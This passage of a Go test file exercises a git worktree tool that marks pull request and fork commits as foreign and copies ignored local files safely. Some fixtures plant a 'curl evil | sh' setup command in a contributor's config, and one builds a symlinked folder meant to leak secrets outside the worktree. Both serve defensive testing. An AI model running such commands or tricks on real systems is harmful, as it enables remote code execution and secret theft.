package worktree

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

// fixture is a repository in a temp folder, with git isolated from the user's config.
type fixture struct {
	t    *testing.T
	g    Git
	home string
	repo string // the main working tree
	root string // where new worktrees go
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git binary")
	}
	base := t.TempDir()
	f := &fixture{t: t, home: filepath.Join(base, "home"), repo: filepath.Join(base, "src", "app"), root: filepath.Join(base, "wt")}
	for _, d := range []string{f.home, f.repo} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	f.g = Git{Env: []string{
		"HOME=" + f.home,
		"XDG_CONFIG_HOME=" + filepath.Join(f.home, ".config"),
		"GIT_CONFIG_NOSYSTEM=1",
		"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com",
		"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com",
	}}
	f.git(f.repo, "init", "-q", "-b", "main")
	f.write(f.repo, "README", "hi\n")
	f.git(f.repo, "add", "README")
	f.git(f.repo, "commit", "-q", "-m", "first")
	return f
}

func (f *fixture) git(dir string, args ...string) string {
	f.t.Helper()
	out, err := f.g.run(context.Background(), dir, args...)
	if err != nil {
		f.t.Fatalf("git %v: %v", args, err)
	}
	return out
}

// gitAt runs git with the committer date daysAgo days back. That date stamps the reflog entry
// the command writes; the author date of a new commit stays now, as in daily use.
func (f *fixture) gitAt(daysAgo int, dir string, args ...string) string {
	f.t.Helper()
	return f.gitWhen(time.Now().Add(-time.Duration(daysAgo)*24*time.Hour), dir, args...)
}

// gitWhen runs git with the committer date when.
func (f *fixture) gitWhen(when time.Time, dir string, args ...string) string {
	f.t.Helper()
	g := f.g
	g.Env = append(slices.Clone(f.g.Env), "GIT_COMMITTER_DATE="+when.Format(time.RFC3339))
	out, err := g.run(context.Background(), dir, args...)
	if err != nil {
		f.t.Fatalf("git %v: %v", args, err)
	}
	return out
}

func (f *fixture) write(dir, rel, body string) {
	f.t.Helper()
	p := filepath.Join(dir, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		f.t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		f.t.Fatal(err)
	}
}

// remote makes a bare repository and pushes main to it under name. It returns the bare
// repository's path, which is also the remote's URL.
func (f *fixture) remote(name string) string {
	f.t.Helper()
	bare := filepath.Join(filepath.Dir(f.root), "remotes", name+".git")
	f.git(filepath.Dir(f.root), "init", "-q", "--bare", bare)
	f.git(f.repo, "remote", "add", name, bare)
	f.git(f.repo, "push", "-q", name, "main")
	return bare
}

func (f *fixture) create(o CreateOptions) (Created, error) {
	if o.Source == "" {
		o.Source = f.repo
	}
	if o.Root == "" && o.Path == "" {
		o.Root = f.root
	}
	return f.g.Create(context.Background(), o)
}

func mustKind(t *testing.T, err, kind error) {
	t.Helper()
	if !errors.Is(err, kind) {
		t.Fatalf("error %v, want %v", err, kind)
	}
}

func TestCreateNewBranch(t *testing.T) {
	f := newFixture(t)
	c, err := f.create(CreateOptions{Branch: "feature/Auth_2"})
	if err != nil {
		t.Fatal(err)
	}
	want := filepath.Join(f.root, "app", "feature-auth-2")
	if canon(c.Worktree.Path) != canon(want) {
		t.Fatalf("path %s, want %s", c.Worktree.Path, want)
	}
	if c.Worktree.Branch != "feature/Auth_2" || !c.NewBranch || c.Worktree.Main || c.Foreign != "" {
		t.Fatalf("created %+v", c)
	}
	if c.Worktree.Head != f.git(f.repo, "rev-parse", "HEAD") {
		t.Fatalf("head %s is not the source HEAD", c.Worktree.Head)
	}
	if canon(c.Source) != canon(f.repo) {
		t.Fatalf("source %s", c.Source)
	}
	// A new branch tracks nothing: its first push names its own branch.
	if _, err := f.g.run(context.Background(), f.repo, "config", "branch.feature/Auth_2.merge"); err == nil {
		t.Fatal("the new branch tracks its base")
	}
	list, err := f.g.List(context.Background(), c.Worktree.Path)
	if err != nil {
		t.Fatal(err)
	}
	if len(list) != 2 || !list[0].Main || list[1].Branch != "feature/Auth_2" {
		t.Fatalf("list %+v", list)
	}
}

func TestCreateGeneratedBranch(t *testing.T) {
	f := newFixture(t)
	c, err := f.create(CreateOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(c.Worktree.Branch, BranchPrefix) || !c.NewBranch {
		t.Fatalf("branch %q", c.Worktree.Branch)
	}
	if filepath.Base(c.Worktree.Path) != Slug(c.Worktree.Branch) {
		t.Fatalf("path %s for branch %s", c.Worktree.Path, c.Worktree.Branch)
	}
}

func TestCreateFromBase(t *testing.T) {
	f := newFixture(t)
	first := f.git(f.repo, "rev-parse", "HEAD")
	f.write(f.repo, "README", "two\n")
	f.git(f.repo, "commit", "-q", "-am", "second")
	f.git(f.repo, "tag", "v1", first)
	c, err := f.create(CreateOptions{Branch: "old", Base: "v1"})
	if err != nil {
		t.Fatal(err)
	}
	if c.Worktree.Head != first || c.Foreign != "" {
		t.Fatalf("created %+v, want head %s", c, first)
	}
}

func TestCreateExistingBranch(t *testing.T) {
	f := newFixture(t)
	f.git(f.repo, "branch", "topic")
	c, err := f.create(CreateOptions{Branch: "topic"})
	if err != nil {
		t.Fatal(err)
	}
	if c.NewBranch || c.Worktree.Branch != "topic" {
		t.Fatalf("created %+v", c)
	}
	f.git(f.repo, "branch", "other")
	_, err = f.create(CreateOptions{Branch: "other", Base: "main"})
	mustKind(t, err, ErrConflict)
}

func TestCreateRefusals(t *testing.T) {
	f := newFixture(t)
	_, err := f.create(CreateOptions{Branch: "main"})
	mustKind(t, err, ErrConflict) // checked out in the main working tree
	_, err = f.create(CreateOptions{Branch: "bad..name"})
	mustKind(t, err, ErrInvalid)
	_, err = f.create(CreateOptions{Branch: "-x"})
	mustKind(t, err, ErrInvalid)
	_, err = f.create(CreateOptions{Branch: "x", Base: "nope"})
	mustKind(t, err, ErrNotFound)
	_, err = f.create(CreateOptions{Branch: "x", Base: "--orphan"})
	mustKind(t, err, ErrInvalid)
	taken := filepath.Join(f.root, "taken")
	if err := os.MkdirAll(taken, 0o755); err != nil {
		t.Fatal(err)
	}
	_, err = f.create(CreateOptions{Branch: "x", Path: taken})
	mustKind(t, err, ErrConflict)
	_, err = f.create(CreateOptions{Branch: "x", Path: "relative/path"})
	mustKind(t, err, ErrInvalid)
	_, err = f.g.Create(context.Background(), CreateOptions{Source: f.repo, Branch: "x"})
	mustKind(t, err, ErrInvalid) // no root and no path
	_, err = f.create(CreateOptions{Source: f.home, Branch: "x"})
	mustKind(t, err, ErrInvalid) // not a repository
	if list, _ := f.g.List(context.Background(), f.repo); len(list) != 1 {
		t.Fatalf("a refused create left a worktree: %+v", list)
	}
}

func TestCreateRemoteBranchAndForeign(t *testing.T) {
	f := newFixture(t)
	origin := f.remote("origin")
	f.remote("fork")
	// A branch only the remotes have.
	f.git(f.repo, "branch", "shared")
	f.git(f.repo, "push", "-q", "origin", "shared")
	f.git(f.repo, "branch", "patch")
	f.git(f.repo, "push", "-q", "fork", "patch")
	f.git(f.repo, "fetch", "-q", "--all")
	f.git(f.repo, "branch", "-D", "shared", "patch")

	identity := "file://" + origin // another spelling of origin's URL
	c, err := f.create(CreateOptions{Branch: "shared", Remote: identity})
	if err != nil {
		t.Fatal(err)
	}
	if c.Foreign != "" || !c.NewBranch {
		t.Fatalf("own remote branch: %+v", c)
	}
	if up := f.git(f.repo, "rev-parse", "--abbrev-ref", "shared@{upstream}"); up != "origin/shared" {
		t.Fatalf("upstream %q, want origin/shared", up)
	}
	c, err = f.create(CreateOptions{Branch: "patch", Remote: identity})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(c.Foreign, "fork") {
		t.Fatalf("fork branch is not foreign: %+v", c)
	}
	// An existing local branch that tracks the fork stays foreign.
	c, err = f.create(CreateOptions{Branch: "patch2", Base: "fork/main", Remote: identity})
	if err != nil {
		t.Fatal(err)
	}
	if c.Foreign == "" {
		t.Fatal("a base from the fork is not foreign")
	}
	f.git(f.repo, "branch", "--set-upstream-to=fork/patch", "patch2")
	f.git(f.repo, "worktree", "remove", c.Worktree.Path)
	c, err = f.create(CreateOptions{Branch: "patch2", Remote: identity})
	if err != nil {
		t.Fatal(err)
	}
	if c.Foreign == "" {
		t.Fatal("a local branch tracking the fork is not foreign")
	}
	// A pull request ref fetched from the project's own remote is foreign too.
	f.git(f.repo, "update-ref", "refs/remotes/origin/pr/7", "HEAD")
	c, err = f.create(CreateOptions{Branch: "review", Base: "origin/pr/7", Remote: identity})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(c.Foreign, "pull request") {
		t.Fatalf("pull request ref: %+v", c)
	}
}

// TestForeignPullRequestPaths: the usual ways a pull request reaches a checkout all count as
// foreign, and a commit on the project's remote counts as its own however it is named.
// prFixture is a repository with origin (the project's remote) and a pull request commit pr,
// made in another clone and pushed to origin under refs/pull/7/head, refs/merge-requests/7/head
// and refs/changes/07/7/1, as the forges keep them. This repository has not fetched it yet.
func prFixture(t *testing.T) (f *fixture, identity, pr string) {
	t.Helper()
	f = newFixture(t)
	origin := f.remote("origin")
	other := filepath.Join(filepath.Dir(f.root), "contributor")
	// -b main: the bare origin's HEAD names no branch, and a clone without it would make the
	// pull request a root commit instead of a child of main.
	f.git(filepath.Dir(f.root), "clone", "-q", "-b", "main", origin, other)
	f.write(other, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
	f.git(other, "add", "flightdeck.json")
	f.git(other, "commit", "-q", "-m", "pr")
	pr = f.git(other, "rev-parse", "HEAD")
	for _, ref := range []string{"refs/pull/7/head", "refs/merge-requests/7/head", "refs/changes/07/7/1"} {
		f.git(other, "push", "-q", "origin", "HEAD:"+ref)
	}
	f.git(f.repo, "fetch", "-q", "origin")
	return f, "file://" + origin, pr
}

// TestForeignRefspecs: a pull request refspec on the project's own remote keeps its refs out of
// the remote's branches, whatever the names, with the default heads refspec beside it. A
// one-off fetch is caught by its name, in any case.
func TestForeignRefspecs(t *testing.T) {
	for _, spec := range []string{
		"+refs/pull/*/head:refs/remotes/origin/pull-request/*",
		"+refs/pull/*/head:refs/remotes/origin/PR/*",
		"+refs/merge-requests/*/head:refs/remotes/origin/mr/*",
		"+refs/pull/*/head:refs/remotes/origin/pr-*",
		"+refs/changes/*:refs/remotes/origin/changes/*",
	} {
		t.Run(spec, func(t *testing.T) {
			f, identity, pr := prFixture(t)
			if got := f.git(f.repo, "config", "--get-all", "remote.origin.fetch"); got != "+refs/heads/*:refs/remotes/origin/*" {
				t.Fatalf("default refspec %q", got)
			}
			f.git(f.repo, "config", "--add", "remote.origin.fetch", spec)
			f.git(f.repo, "fetch", "-q", "origin")
			if refs := f.git(f.repo, "for-each-ref", "--contains", pr, "refs/remotes/origin/"); refs == "" {
				t.Fatal("the refspec fetched nothing")
			}
			c, err := f.create(CreateOptions{Branch: "b", Base: pr, Remote: identity})
			if err != nil || c.Foreign == "" {
				t.Fatalf("a commit id under %s: %+v %v", spec, c, err)
			}
		})
	}
	for _, dst := range []string{"refs/remotes/origin/PR/7", "refs/remotes/origin/mr/7", "refs/remotes/origin/changes/07/7/1"} {
		t.Run("one-off fetch to "+dst, func(t *testing.T) {
			f, identity, pr := prFixture(t)
			f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head:"+dst)
			c, err := f.create(CreateOptions{Branch: "b", Base: pr, Remote: identity})
			if err != nil || c.Foreign == "" {
				t.Fatalf("a commit id under %s: %+v %v", dst, c, err)
			}
		})
	}
}

func TestBranchRef(t *testing.T) {
	heads := refspec{"refs/heads/*", "refs/remotes/origin/*"}
	pulls := refspec{"refs/pull/*/head", "refs/remotes/origin/pr-*"}
	all := refspec{"refs/*", "refs/remotes/origin/*"}
	one := refspec{"refs/heads/main", "refs/remotes/origin/main"}
	for _, c := range []struct {
		ref   string
		specs []refspec
		want  bool
	}{
		{"refs/remotes/origin/main", []refspec{heads}, true},
		{"refs/remotes/origin/pr-7", []refspec{heads, pulls}, false},
		{"refs/remotes/origin/pr-", []refspec{heads, pulls}, false}, // the * may match nothing
		{"refs/remotes/origin/main", []refspec{heads, pulls}, true},
		{"refs/remotes/origin/main", []refspec{all}, false},
		{"refs/remotes/origin/main", []refspec{one}, true},
		{"refs/remotes/origin/dev", []refspec{one}, false},
		{"refs/remotes/origin/main", nil, false},
	} {
		if got := branchRef(c.ref, c.specs); got != c.want {
			t.Errorf("branchRef(%s, %v) = %v", c.ref, c.specs, got)
		}
	}
}

// TestReflogRuleBounds: an amend of a pull request commit stays foreign; more than
// maxLocalCommits local commits are foreign; a start point that moves between the check and
// git worktree add is foreign.
func TestReflogRuleBounds(t *testing.T) {
	f, identity, pr := prFixture(t)
	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head:refs/heads/pr-7")
	f.git(f.repo, "checkout", "-q", "-b", "am", pr)
	f.git(f.repo, "commit", "-q", "--amend", "-m", "reworded")
	f.git(f.repo, "checkout", "-q", "main")
	if c, err := f.create(CreateOptions{Branch: "am", Remote: identity}); err != nil || c.Foreign == "" {
		t.Errorf("an amended pull request: %+v %v", c, err)
	}

	f.git(f.repo, "checkout", "-q", "-b", "many", "origin/main")
	for i := range maxLocalCommits + 1 {
		f.git(f.repo, "commit", "-q", "--allow-empty", "-m", strconv.Itoa(i))
	}
	f.git(f.repo, "checkout", "-q", "main")
	if c, err := f.create(CreateOptions{Branch: "many", Remote: identity}); err != nil || c.Foreign == "" {
		t.Errorf("%d local commits: %+v %v", maxLocalCommits+1, c, err)
	}
	if c, err := f.create(CreateOptions{Branch: "fewer", Base: "many~1", Remote: identity}); err != nil || c.Foreign != "" {
		t.Errorf("%d local commits: %+v %v", maxLocalCommits, c, err)
	}

	// A commit made on a detached HEAD in another linked worktree is in that worktree's reflog,
	// which is read though no branch or main HEAD holds it.
	det := filepath.Join(f.root, "detached")
	f.git(f.repo, "worktree", "add", "-q", "--detach", det, "origin/main")
	f.git(det, "commit", "-q", "--allow-empty", "-m", "on a detached head")
	if c, err := f.create(CreateOptions{Branch: "fromdet", Base: f.git(det, "rev-parse", "HEAD"), Remote: identity}); err != nil || c.Foreign != "" {
		t.Errorf("a commit from a linked worktree's detached HEAD: %+v %v", c, err)
	}

	f.git(f.repo, "branch", "moving", "origin/main")
	testHookAfterCheck = func() { f.git(f.repo, "update-ref", "refs/heads/moving", pr) }
	defer func() { testHookAfterCheck = nil }()
	if c, err := f.create(CreateOptions{Branch: "moving", Remote: identity}); err != nil || !strings.Contains(c.Foreign, "moved") {
		t.Errorf("a start point that moved: %+v %v", c, err)
	}
}

// TestR3OwnAmendTimeGaps: an own commit amended days later stays own, though git lists the
// branch's and HEAD's reflog entries interleaved by date.
func TestR3OwnAmendTimeGaps(t *testing.T) {
	f, identity, _ := prFixture(t)
	f.gitAt(5, f.repo, "checkout", "-q", "-b", "mine", "origin/main")
	f.gitAt(4, f.repo, "commit", "-q", "--allow-empty", "-m", "mine")
	f.gitAt(3, f.repo, "commit", "-q", "--allow-empty", "--amend", "-m", "mine amended")
	f.gitAt(2, f.repo, "checkout", "-q", "main")
	if c, err := f.create(CreateOptions{Branch: "mine", Remote: identity}); err != nil || c.Foreign != "" {
		t.Fatalf("an own commit amended later: %+v %v", c, err)
	}
}

// expireGap checks out the pull request 40 days ago in dir, amends it 10 days ago, and runs the
// reflog expiry gc runs, which drops the checkout entry. The amend's next older entry is then
// an origin/main commit. It returns the amended commit and checks that the gap is real.
func expireGap(t *testing.T, f *fixture, dir, logRef, pr string) string {
	t.Helper()
	f.gitAt(45, dir, "checkout", "-q", "--detach", "origin/main")
	f.gitAt(40, dir, "checkout", "-q", "--detach", pr)
	f.gitAt(10, dir, "commit", "-q", "--amend", "-m", "reworded")
	a := f.git(dir, "rev-parse", "HEAD")
	f.git(f.repo, "reflog", "expire", "--expire=90.days.ago", "--expire-unreachable=30.days.ago", "--all")
	if log := f.git(f.repo, "reflog", "show", "--format=%H", logRef); strings.Contains(log, pr) {
		t.Fatalf("the expiry kept the pull request's checkout entry:\n%s", log)
	}
	return a
}

// TestR3ExpireGapLinked: after gc's expiry, an amended pull request in a linked worktree stays
// foreign: the amend's surviving older entry has other parents.
func TestR3ExpireGapLinked(t *testing.T) {
	f, identity, pr := prFixture(t)
	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head")
	det := filepath.Join(f.root, "det")
	f.git(f.repo, "worktree", "add", "-q", "--detach", det, "origin/main")
	a := expireGap(t, f, det, "worktrees/det/HEAD", pr)
	if c, err := f.create(CreateOptions{Branch: "b", Base: a, Remote: identity}); err != nil || c.Foreign == "" {
		t.Fatalf("an amended pull request after the expiry: %+v %v", c, err)
	}
}

// TestR3ExpireGapDetached is TestR3ExpireGapLinked on the main worktree's detached HEAD.
func TestR3ExpireGapDetached(t *testing.T) {
	f, identity, pr := prFixture(t)
	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head")
	a := expireGap(t, f, f.repo, "HEAD", pr)
	f.git(f.repo, "checkout", "-q", "main")
	if c, err := f.create(CreateOptions{Branch: "b", Base: a, Remote: identity}); err != nil || c.Foreign == "" {
		t.Fatalf("an amended pull request after the expiry: %+v %v", c, err)
	}
}

// TestR3Cycle: --no-edit amends in one second make the same commit again, a self cycle in the
// amend entries. A pull request amended that way is foreign within a second; an own commit is
// own.
func TestR3Cycle(t *testing.T) {
	f, _, pr := prFixture(t)
	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head")
	trusted := []string{"refs/remotes/origin/main"}
	check := func(name, commit string, want bool) {
		t.Helper()
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		if got := f.g.committedHere(ctx, f.repo, commit, trusted); got != want || ctx.Err() != nil {
			t.Fatalf("%s: own %v, want %v (deadline: %v)", name, got, want, ctx.Err())
		}
	}
	f.git(f.repo, "checkout", "-q", "-b", "am", pr)
	f.git(f.repo, "commit", "-q", "--amend", "-m", "x")
	for range 4 {
		f.git(f.repo, "commit", "-q", "--amend", "--no-edit")
	}
	tip := f.git(f.repo, "rev-parse", "HEAD")
	if idx := f.g.readReflogs(context.Background(), f.repo); slices.Contains(idx.from[tip], tip) {
		t.Fatal("an amend lists itself as the commit it replaced")
	}
	check("a pull request amended with --no-edit", tip, false)

	// Amends that go back and forth between three messages, at one committer date, make the
	// same three commits again and again: each lists the other two as replaced, a cycle with a
	// fan-out of two at every step. Without the memo the depth bound alone allows 2^8 checks.
	when := time.Now().Add(-time.Hour)
	f.git(f.repo, "checkout", "-q", "-b", "fan", pr)
	for _, m := range strings.Fields("x y x z x y z y x z y z x") {
		f.gitWhen(when, f.repo, "commit", "-q", "--amend", "-m", m)
	}
	check("a pull request amended back and forth", f.git(f.repo, "rev-parse", "HEAD"), false)

	f.git(f.repo, "checkout", "-q", "-b", "own", "origin/main")
	f.git(f.repo, "commit", "-q", "--allow-empty", "-m", "own")
	for range 4 {
		f.git(f.repo, "commit", "-q", "--allow-empty", "--amend", "--no-edit")
	}
	check("an own commit amended with --no-edit", f.git(f.repo, "rev-parse", "HEAD"), true)
	f.git(f.repo, "checkout", "-q", "main")
}

// TestRebaseAndCherryPick: own commits rebased onto a newer origin/main, or cherry-picked, stay
// own; a cherry-picked or rebased pull request commit stays foreign.
func TestRebaseAndCherryPick(t *testing.T) {
	f, identity, pr := prFixture(t)
	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head")
	commit := func(file string) {
		f.write(f.repo, file, file+"\n")
		f.git(f.repo, "add", file)
		f.git(f.repo, "commit", "-q", "-m", file)
	}
	// Two own commits, then origin/main moves on, then a rebase onto it. The steps a second
	// apart, so the rebase makes new commits rather than the same ones again.
	f.gitAt(4, f.repo, "checkout", "-q", "-b", "mine", "origin/main")
	commit("a.txt")
	commit("b.txt")
	f.git(f.repo, "checkout", "-q", "-b", "up", "origin/main")
	commit("up.txt")
	f.git(f.repo, "push", "-q", "origin", "up:main")
	f.git(f.repo, "fetch", "-q", "origin")
	f.git(f.repo, "checkout", "-q", "mine")
	before := f.git(f.repo, "rev-parse", "HEAD")
	f.gitAt(1, f.repo, "rebase", "-q", "origin/main")
	if f.git(f.repo, "rev-parse", "HEAD") == before {
		t.Fatal("the rebase made no new commits")
	}
	f.git(f.repo, "checkout", "-q", "main")
	if c, err := f.create(CreateOptions{Branch: "mine", Remote: identity}); err != nil || c.Foreign != "" {
		t.Errorf("own commits rebased onto origin/main: %+v %v", c, err)
	}
	// An own commit cherry-picked onto another branch.
	f.gitAt(1, f.repo, "checkout", "-q", "-b", "picked", "origin/main")
	f.gitAt(1, f.repo, "cherry-pick", "mine~1")
	f.git(f.repo, "checkout", "-q", "main")
	if c, err := f.create(CreateOptions{Branch: "picked", Remote: identity}); err != nil || c.Foreign != "" {
		t.Errorf("an own commit cherry-picked: %+v %v", c, err)
	}
	// The pull request commit cherry-picked, and rebased, onto origin/main.
	f.git(f.repo, "checkout", "-q", "-b", "cp", "origin/main")
	f.git(f.repo, "cherry-pick", pr)
	f.git(f.repo, "checkout", "-q", "-b", "rb", pr)
	f.git(f.repo, "rebase", "-q", "origin/main")
	f.git(f.repo, "checkout", "-q", "main")
	for _, b := range []string{"cp", "rb"} {
		if c, err := f.create(CreateOptions{Branch: b, Remote: identity}); err != nil || c.Foreign == "" {
			t.Errorf("a pull request commit on %s: %+v %v", b, c, err)
		}
	}
}

func TestForeignPullRequestPaths(t *testing.T) {
	f := newFixture(t)
	origin := f.remote("origin")
	fork := f.remote("fork")
	identity := "file://" + origin
	// A commit only the fork has, made in someone else's clone, so this repository's reflog
	// never saw it committed.
	other := filepath.Join(filepath.Dir(f.root), "other")
	f.git(filepath.Dir(f.root), "clone", "-q", "-b", "main", fork, other)
	f.write(other, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
	f.git(other, "add", "flightdeck.json")
	f.git(other, "commit", "-q", "-m", "pr")
	pr := f.git(other, "rev-parse", "HEAD")
	f.git(other, "push", "-q", "origin", "HEAD:patch")
	f.git(f.repo, "fetch", "-q", "--all")
	own := f.git(f.repo, "rev-parse", "origin/main")

	foreign := func(name string, o CreateOptions) {
		t.Helper()
		o.Remote = identity
		c, err := f.create(o)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if c.Foreign == "" {
			t.Errorf("%s: counted as the project's own", name)
		}
	}
	// gh pr checkout: a local branch that follows refs/pull/N/head of origin.
	f.git(f.repo, "branch", "gh-7", pr)
	f.git(f.repo, "config", "branch.gh-7.remote", "origin")
	f.git(f.repo, "config", "branch.gh-7.merge", "refs/pull/7/head")
	foreign("gh pr checkout", CreateOptions{Branch: "gh-7"})
	// gh pr checkout of a fork's PR: the branch follows the fork's URL.
	f.git(f.repo, "branch", "gh-8", own)
	f.git(f.repo, "config", "branch.gh-8.remote", "https://example.com/someone/app.git")
	f.git(f.repo, "config", "branch.gh-8.merge", "refs/heads/patch")
	foreign("a branch that follows another URL", CreateOptions{Branch: "gh-8"})
	// git fetch origin pull/7/head:pr-7, then the branch with no upstream.
	f.git(f.repo, "branch", "pr-7", pr)
	foreign("a fetched pull request branch", CreateOptions{Branch: "pr-7"})
	// The commit named without a ref name.
	f.git(f.repo, "fetch", "-q", "fork", "patch")
	foreign("FETCH_HEAD", CreateOptions{Branch: "b1", Base: "FETCH_HEAD"})
	foreign("a commit id", CreateOptions{Branch: "b2", Base: pr})
	foreign("^{commit}", CreateOptions{Branch: "b3", Base: "fork/patch^{commit}"})
	foreign("~0", CreateOptions{Branch: "b4", Base: "fork/patch~0"})

	// Pull requests fetched into the project remote's own namespace, as GitHub documents
	// (+refs/pull/*/head:refs/remotes/origin/pr/*): those refs are not the project's branches.
	f.git(f.repo, "fetch", "-q", "fork", "patch:refs/remotes/origin/pr/7")
	foreign("a commit id under origin/pr/*", CreateOptions{Branch: "b5", Base: pr})
	f.git(f.repo, "fetch", "-q", "fork", "patch")
	foreign("FETCH_HEAD under origin/pr/*", CreateOptions{Branch: "b6", Base: "FETCH_HEAD"})
	foreign("~0 under origin/pr/*", CreateOptions{Branch: "b7", Base: "origin/pr/7~0"})

	// The reflog rule: commits this repository made with git commit count as own; a commit
	// stacked on a pull request does not, since its parent was fetched.
	commit := func(branch, from, file string, amend bool) {
		t.Helper()
		f.git(f.repo, "checkout", "-q", "-b", branch, from)
		f.write(f.repo, file, branch+"\n")
		f.git(f.repo, "add", file)
		f.git(f.repo, "commit", "-q", "-m", branch)
		if amend {
			f.write(f.repo, file, branch+" amended\n")
			f.git(f.repo, "commit", "-q", "-a", "--amend", "-m", branch+" amended")
		}
		f.git(f.repo, "checkout", "-q", "main")
	}
	commit("mine", "origin/main", "mine.txt", false)
	f.git(f.repo, "checkout", "-q", "mine")
	f.write(f.repo, "mine2.txt", "two\n")
	f.git(f.repo, "add", "mine2.txt")
	f.git(f.repo, "commit", "-q", "-m", "second")
	f.git(f.repo, "checkout", "-q", "main")
	commit("amended", "origin/main", "am.txt", true)
	commit("stacked", pr, "stack.txt", false)
	foreign("a local commit on a pull request", CreateOptions{Branch: "stacked"})

	for name, o := range map[string]CreateOptions{
		"origin's commit by id": {Branch: "o1", Base: own},
		"origin/main":           {Branch: "o2", Base: "origin/main"},
		"HEAD on origin":        {Branch: "o3"},
		"two unpushed commits":  {Branch: "mine"},
		"an amended commit":     {Branch: "amended"},
		"a base on local work":  {Branch: "o4", Base: "mine~1"},
	} {
		o.Remote = identity
		c, err := f.create(o)
		if err != nil || c.Foreign != "" {
			t.Errorf("%s: %+v %v", name, c, err)
		}
	}
}

func TestIncludeCopies(t *testing.T) {
	f := newFixture(t)
	f.write(f.repo, ".gitignore", ".env\nconfig/*.local.json\nbuild/\n")
	f.write(f.repo, IncludeFile, "# local files\n.env\nconfig/*.local.json\n!config/prod.local.json\nnotes.txt\nREADME\n")
	f.git(f.repo, "add", ".gitignore", IncludeFile)
	f.git(f.repo, "commit", "-q", "-m", "ignore")
	f.write(f.repo, ".env", "TOKEN=x\n")
	f.write(f.repo, "config/dev.local.json", "{}\n")
	f.write(f.repo, "config/prod.local.json", "{}\n")
	f.write(f.repo, "notes.txt", "untracked, not ignored\n")
	f.write(f.repo, "build/out.bin", "ignored, not included\n")
	if err := os.Chmod(filepath.Join(f.repo, ".env"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(".env", filepath.Join(f.repo, "config", "link.local.json")); err != nil {
		t.Fatal(err)
	}

	c, err := f.create(CreateOptions{Branch: "inc"})
	if err != nil {
		t.Fatal(err)
	}
	slices.Sort(c.Copied)
	want := []string{".env", "config/dev.local.json", "config/link.local.json"}
	if !slices.Equal(c.Copied, want) {
		t.Fatalf("copied %v, want %v", c.Copied, want)
	}
	fi, err := os.Stat(filepath.Join(c.Worktree.Path, ".env"))
	if err != nil || fi.Mode().Perm() != 0o600 {
		t.Fatalf(".env: %v %v", fi, err)
	}
	if target, err := os.Readlink(filepath.Join(c.Worktree.Path, "config", "link.local.json")); err != nil || target != ".env" {
		t.Fatalf("link: %q %v", target, err)
	}
	for _, rel := range []string{"config/prod.local.json", "notes.txt", "build/out.bin"} {
		if _, err := os.Lstat(filepath.Join(c.Worktree.Path, rel)); err == nil {
			t.Fatalf("%s was copied", rel)
		}
	}
	// Copying is not a change git sees.
	if dirty, err := f.g.Dirty(context.Background(), c.Worktree.Path); err != nil || dirty {
		t.Fatalf("dirty %v %v", dirty, err)
	}
}

func TestIncludeKeepsExisting(t *testing.T) {
	dir := t.TempDir()
	from, to := filepath.Join(dir, "a"), filepath.Join(dir, "b")
	if err := os.WriteFile(from, []byte("new"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(to, []byte("old"), 0o644); err != nil {
		t.Fatal(err)
	}
	root, err := os.OpenRoot(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer root.Close()
	b := &copyBudget{ctx: context.Background(), files: 10, bytes: 1 << 20}
	if ok, err := copyOne(b, from, root, "b"); ok || err != nil {
		t.Fatalf("copyOne %v %v", ok, err)
	}
	if b, _ := os.ReadFile(to); string(b) != "old" {
		t.Fatalf("contents %q", b)
	}
}

// TestIncludeRefusesSymlinkedFolder: a start point that commits a folder as a symbolic link to a
// place outside the worktree cannot steer the included files there. Creation fails and undoes.
func TestIncludeRefusesSymlinkedFolder(t *testing.T) {
	f := newFixture(t)
	outside := filepath.Join(filepath.Dir(f.root), "outside")
	if err := os.MkdirAll(outside, 0o755); err != nil {
		t.Fatal(err)
	}
	f.write(f.repo, ".gitignore", ".env\n")
	f.write(f.repo, IncludeFile, "secrets/\n")
	f.git(f.repo, "add", ".gitignore", IncludeFile)
	f.git(f.repo, "commit", "-q", "-m", "ignore")
	f.git(f.repo, "checkout", "-q", "-b", "evil")
	if err := os.Symlink(outside, filepath.Join(f.repo, "secrets")); err != nil {
		t.Fatal(err)
	}
	f.git(f.repo, "add", "secrets")
	f.git(f.repo, "commit", "-q", "-m", "link")
	f.git(f.repo, "checkout", "-q", "main")
	f.write(f.repo, "secrets/.env", "TOKEN=x\n") // a real folder in the source checkout

	_, err := f.create(CreateOptions{Branch: "pr", Base: "evil"})
	if err == nil {
		t.Fatal("create copied through a symbolic link that leaves the worktree")
	}
	if _, err := os.Stat(filepath.Join(outside, ".env")); err == nil {
		t.Fatal("the included file landed outside the worktree")
	}
	if list, _ := f.g.List(context.Background(), f.repo); len(list) != 1 {
		t.Fatalf("worktree left behind: %+v", list)
	}
}

// TestIncludeBounds: past the file or byte bound, or with the deadline gone, creation fails and
// undoes.
func TestIncludeBounds(t *testing.T) {
	f := newFixture(t)
	f.write(f.repo, ".gitignore", "*.local\n")
